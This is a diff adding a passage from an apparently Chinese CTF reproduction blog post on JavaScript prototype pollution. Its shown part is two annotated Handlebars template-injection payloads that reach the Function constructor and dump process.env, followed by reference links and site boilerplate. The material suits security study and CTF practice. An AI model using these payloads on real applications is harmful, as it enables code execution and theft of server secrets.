+        {{arr.push obj.constructor.name.constructor.bind}} # 把bind存入array
+        {{arr.pop}} # 因为handlerbars调用函数会加个this在后面，所以pop掉
+        {{arr.push "return JSON.stringify(process.env);"}} # 把payload存入array
+        {{arr.pop}} # 因为handlerbars调用函数会加个this在后面，所以pop掉
+            {{#blockHelperMissing obj.constructor.name.constructor.bind}}
+              {{#with (arr.constructor (obj.constructor.name.constructor.bind.apply obj.constructor.name.constructor arr))}} # 以obj.constructor.name.constructor为this，arr为参数调用obj.constructor.name.constructor.bind创建新函数，新函数拥有和obj.constructor.name.constructor一样的函数体，调用该函数会返回payload，将恶意函数绑定放到一个数组中，键为0
+                {{#with (obj.constructor.getOwnPropertyDescriptor this 0)}} # 获取描述符
+                  {{#with (obj.constructor.defineProperty obj.constructor.prototype "toString" this)}} # 在obj.constructor.prototype上定义toString属性为恶意函数
+                     {{#with (obj.constructor.constructor "test")}} # 这个test字符串可以省略，调用obj.constructor.constructor(this)，调用的时候会触发this的toString，即返回并执行了&#39;return JSON.stringify(process.env);&#39;
+                        {{this}} # 将执行结果打印出来
+                     {{/with}}
+                  {{/with}}
+                {{/with}}
+              {{/with}}
+            {{/blockHelperMissing}}
+  {{/with}}
+{{/with}}
+</code></pre>
+<pre><code class="handlebars">{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}} # e.split创建数组
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}} # sub也可以换成其他函数，比如endsWith，将string.sub修改为了conslist.sub
+      {{this.pop}}
+      # 此时conslist中只有一个Function
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return JSON.stringify(process.env);"}}
+        {{this.pop}}
+        # 此时codelist中只有一个字符串payload
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}} # 通过apply调用Function执行代码
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+</code></pre>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://xz.aliyun.com/t/2735" target="_blank" rel="noopener">https://xz.aliyun.com/t/2735</a></p>
+<p><a href="https://xz.aliyun.com/t/4229" target="_blank" rel="noopener">https://xz.aliyun.com/t/4229</a></p>
+<p><a href="https://www.anquanke.com/post/id/176121" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176121</a></p>
+<p><a href="https://www.cnblogs.com/zhumingzhenhao/p/8337146.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhumingzhenhao/p/8337146.html</a></p>
+<p><a href="https://blog.csdn.net/leviscar/article/details/78484090" target="_blank" rel="noopener">https://blog.csdn.net/leviscar/article/details/78484090</a></p>
+<p><a href="https://blog.l0ca1.xyz/Code-Breaking" target="_blank" rel="noopener">https://blog.l0ca1.xyz/Code-Breaking</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/复现/">复现</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/04/16/Nodejs-express-session-file-store库下的session伪造/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Nodejs/express/session-file-store库下的session伪造</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/04/07/西湖论剑Web/">
+                        <span>西湖论剑Web</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "JavaScript原型链污染&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
